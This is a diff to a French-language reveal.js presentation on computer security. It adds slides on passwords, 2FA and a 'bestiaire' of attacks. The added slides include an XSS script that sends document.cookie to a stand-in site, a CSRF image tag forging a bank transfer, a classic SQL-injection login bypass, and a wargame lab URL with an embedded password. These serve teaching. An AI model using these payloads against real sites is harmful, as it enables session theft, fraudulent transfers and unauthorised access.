@@ -58,6 +58,12 @@
                     data-background-image="https://i1.wp.com/www.auctionlab.news/wp-content/uploads/2017/12/enigma-machine-cryptage-code-nazis-encheres.jpg">
                 </section>
                 <section data-markdown>
+                    ### Mots de Passe
+                </section>
+                <section data-markdown>
+                    ## 2FA
+                </section>
+                <section data-markdown>
                     ### HTTPS
                 </section>
                 <section data-markdown> ![http](assets/images/http-dns-2.png) </section>
@@ -79,6 +85,76 @@
                 </section>
                 <section data-markdown>
                     ![tor](https://cdn.arstechnica.net/wp-content/uploads/2014/01/tor-structure.jpg)
+                </section>
+                <section data-markdown
+                    data-background-image="https://ff-65a4.kxcdn.com/assets/uploads/OriginalDocs_old/143/oxford-bestiary-facsimile-edition-15.jpg">
+                    ## Bestiaire
+                </section>
+                <section data-markdown>
+                    ## DDos
+                </section>
+                <section data-markdown> ### Cross-Site Scripting (XSS) </section>
+                <section>
+                    <pre>
+                        <code class="hljs html">
+
+ &lt;script&gt
+     document.write(
+         '&lt;img src="mywebsite?cookie=' + document.cookie + '" /&gt'
+     )
+ &lt;/script&gt
+
+                        </code>
+                    </pre>
+                </section>
+                <section data-markdown> ### Cross-Site Request Forgery (CSRF) </section>
+                <section>
+                    <pre>
+                        <code class="hljs html">
+
+  &lt;body&gt
+      &lt;img src="https://hsbc.com/transfer?to=nicolas&amt=5000" /&gt
+  &lt;/body&gt
+
+                        </code>
+                    </pre>
+                </section>
+                <section data-markdown> ### SQL Injection </section>
+                <section
+                    data-background-iframe="http://natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1@natas14.natas.labs.overthewire.org/"
+                    data-interactive>
+                </section>
+                <section>
+                    <pre>
+                        <code class="hljs sql">
+
+            SELECT * FROM utilisateurs
+            WHERE (utilisateur = "nicolas")
+            AND (motdepasse = "monpassword")
+
+                        </code>
+                    </pre>
+                </section>
+                <section>
+                    <pre>
+                        <code class="hljs sql">
+
+            SELECT * FROM utilisateurs
+            WHERE (utilisateur = "hacker")
+            AND (motdepasse = "1" OR "1" = "1")
+
+                        </code>
+                    </pre>
+                </section>
+                <section data-markdown> ## 0day </section>
+                <section data-background-iframe="https://fr.wikipedia.org/wiki/EternalBlue">
+                </section>
+                <section data-background-iframe="https://rambleed.com/">
+                </section>
+                <section data-markdown> ### Social Engineering </section>
+                <section>
+                    <img style="height: 650px;" alt="comcyber"
+                        src="https://upload.wikimedia.org/wikipedia/fr/thumb/7/70/COMCYBER-Ministere-des-armees-CMJN.PNG/1200px-COMCYBER-Ministere-des-armees-CMJN.PNG"></img>
                 </section>
                 <section
                     data-background-iframe="https://konard.github.io/twittermatrix/messages.html">
